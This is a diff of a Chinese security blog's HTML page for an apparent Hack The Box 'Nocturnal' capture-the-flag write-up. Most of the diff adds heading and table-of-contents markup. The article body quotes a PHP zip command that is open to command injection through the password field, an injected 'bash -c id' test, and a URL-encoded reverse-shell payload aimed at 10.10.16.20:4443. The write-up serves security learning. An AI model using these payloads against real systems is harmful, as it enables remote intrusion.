@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="$command &#x3D; &quot;zip -x &#39;.&#x2F;backups&#x2F;*&#39; -r -P &quot; . $password . &quot; &quot; . $backupFile . &quot; .  &gt; &quot; . $logFile . &quot; 2&gt;&amp;1 &amp;&quot;; $command &#x3D; “zip -x ‘.&amp;#x2">
+    <meta name="description" content="htb-nocturnal 解题记录$command &#x3D; &quot;zip -x &#39;.&#x2F;backups&#x2F;*&#39; -r -P &quot; . $password . &quot; &quot; . $backupFile . &quot; .  &gt; &quot; . $logFile . &quot; 2&gt;&amp;1 &amp;&quot;; $command &amp;#x">
 <meta property="og:type" content="article">
 <meta property="og:title" content="htb-nocturnal">
 <meta property="og:url" content="https://feesec.github.io/2025/04/26/htb-nocturnal/index.html">
 <meta property="og:site_name" content="安全杂谈 | 网络安全、渗透测试、信息安全技术分享">
-<meta property="og:description" content="$command &#x3D; &quot;zip -x &#39;.&#x2F;backups&#x2F;*&#39; -r -P &quot; . $password . &quot; &quot; . $backupFile . &quot; .  &gt; &quot; . $logFile . &quot; 2&gt;&amp;1 &amp;&quot;; $command &#x3D; “zip -x ‘.&amp;#x2">
+<meta property="og:description" content="htb-nocturnal 解题记录$command &#x3D; &quot;zip -x &#39;.&#x2F;backups&#x2F;*&#39; -r -P &quot; . $password . &quot; &quot; . $backupFile . &quot; .  &gt; &quot; . $logFile . &quot; 2&gt;&amp;1 &amp;&quot;; $command &amp;#x">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://feesec.github.io/assets/img/htb-nocturnal/image.png">
 <meta property="og:image" content="https://feesec.github.io/assets/img/htb-nocturnal/image-1.png">
@@ -108,6 +108,8 @@
     <span id="actions">
       <ul>
         
+        <li><a class="icon" aria-label="上一篇" href="/2025/04/26/DE/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
         
         <li><a class="icon" aria-label="下一篇" href="/2025/04/26/ai-and-sec/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
@@ -137,6 +139,10 @@
 
     </div>
     
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#htb-nocturnal-%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">htb-nocturnal 解题记录</span></a></li></ol>
+      </div>
     
   </span>
 </div>
@@ -182,7 +188,7 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p><code>$command = &quot;zip -x &#39;./backups/*&#39; -r -P &quot; . $password . &quot; &quot; . $backupFile . &quot; .  &gt; &quot; . $logFile . &quot; 2&gt;&amp;1 &amp;&quot;;</code></p>
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="htb-nocturnal-解题记录"><a href="#htb-nocturnal-解题记录" class="headerlink" title="htb-nocturnal 解题记录"></a>htb-nocturnal 解题记录</h1><p><code>$command = &quot;zip -x &#39;./backups/*&#39; -r -P &quot; . $password . &quot; &quot; . $backupFile . &quot; .  &gt; &quot; . $logFile . &quot; 2&gt;&amp;1 &amp;&quot;;</code></p>
 <p>$command &#x3D; “zip -x ‘.&#x2F;backups&#x2F;*’ -r -P<br>bash -c ‘id’<br> “ . $backupFile . “ .  &gt; “ . $logFile . “ 2&gt;&amp;1 &amp;”;</p>
 <p>%0abash%09-c%09%22bash+-i+%3e%26+%2fdev%2ftcp%2f10.10.16.20%2f4443+0%3e%261%22%0a</p>
 <p><a href="/../assets/img/htb-nocturnal/image.png" title="alt text" class="gallery-item"><img src="/../assets/img/htb-nocturnal/image.png" alt="alt text"></a></p>
@@ -244,6 +250,10 @@
 
     
     
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#htb-nocturnal-%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">htb-nocturnal 解题记录</span></a></li></ol>
+      </div>
+    
 
     <div id="share-footer" style="display: none">
       <ul>
@@ -264,6 +274,8 @@
 
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
         
         <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
